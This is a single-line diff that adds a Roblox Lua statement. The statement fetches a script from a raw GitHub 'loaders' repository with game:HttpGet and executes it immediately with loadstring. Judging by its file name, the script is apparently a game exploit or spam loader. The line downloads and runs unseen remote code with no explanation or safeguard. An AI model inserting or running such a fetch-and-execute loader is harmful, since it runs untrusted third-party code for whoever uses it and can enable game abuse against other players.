@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/morph-world-mimicer-spam4-lpm2g7sbjoljxq.lua"))()
